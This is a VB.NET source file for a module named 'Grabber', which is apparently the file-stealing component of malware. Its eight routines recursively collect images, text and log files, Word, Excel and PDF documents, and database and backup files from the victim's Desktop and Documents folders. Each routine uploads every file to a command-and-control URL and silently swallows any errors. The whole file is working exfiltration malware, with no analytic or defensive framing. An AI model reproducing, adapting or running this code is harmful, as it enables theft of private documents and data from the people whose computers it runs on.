Imports System.Net
Imports System.IO
Imports System.Management
Module Grabber

    Public URL_CC1 As String
    Public URL_CC2 As String
    Public URL_CC3 As String
    Public URL_CC4 As String
    Public URL_CC5 As String
    Public URL_CC6 As String
    Public URL_CC7 As String
    Public URL_CC8 As String

    '#############################################
    '################## Grab Photo ############### 
    '#############################################
    Public Sub grab_photo_from_desktop(URL_CC1)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.jpg", "*.png", "*.gif", "*.bmp", "*.jpge")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC1, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    Public Sub grab_photo_from_Document(URL_CC2)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments, FileIO.SearchOption.SearchAllSubDirectories, "*.jpg", "*.png", "*.gif", "*.bmp", "*.jpge")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC2, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub

    '#############################################
    '################## Grab TXT   ############### 
    '#############################################
    Public Sub grab_TXT_from_desktop(URL_CC3)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.txt", "*.log")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC3, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    Public Sub grab_TXT_from_Document(URL_CC4)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments, FileIO.SearchOption.SearchAllSubDirectories, "*.txt", "*.log")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC4, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    '#############################################
    '################## Grab Docs  ############### 
    '#############################################
    Public Sub grab_docs_from_desktop(URL_CC5)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.doc", "*.docx", "*.pdf", "*.xlsx")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC5, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    Public Sub grab_docs_from_Document(URL_CC6)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments, FileIO.SearchOption.SearchAllSubDirectories, "*.doc", "*.docx", "*.pdf", "*.xlsx")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC6, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    '#############################################
    '################## Grab DB    ############### 
    '#############################################
    Public Sub grab_db_from_desktop(URL_CC7)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.Desktop, FileIO.SearchOption.SearchAllSubDirectories, "*.sql", "*.bak", "*.db", "*.accdb")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC7, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub
    Public Sub grab_db_from_Document(URL_CC8)
        Try
            For Each foundFile As String In My.Computer.FileSystem.GetFiles(My.Computer.FileSystem.SpecialDirectories.MyDocuments, FileIO.SearchOption.SearchAllSubDirectories, "*.sql", "*.bak", "*.db", "*.accdb")
                Using we As New WebClient()
                    Dim responseArray As Byte()
                    responseArray = we.UploadFile(URL_CC8, foundFile)
                    foundFile = System.Text.Encoding.ASCII.GetString(responseArray)
                End Using
            Next
        Catch ex As Exception

        End Try
    End Sub


End Module
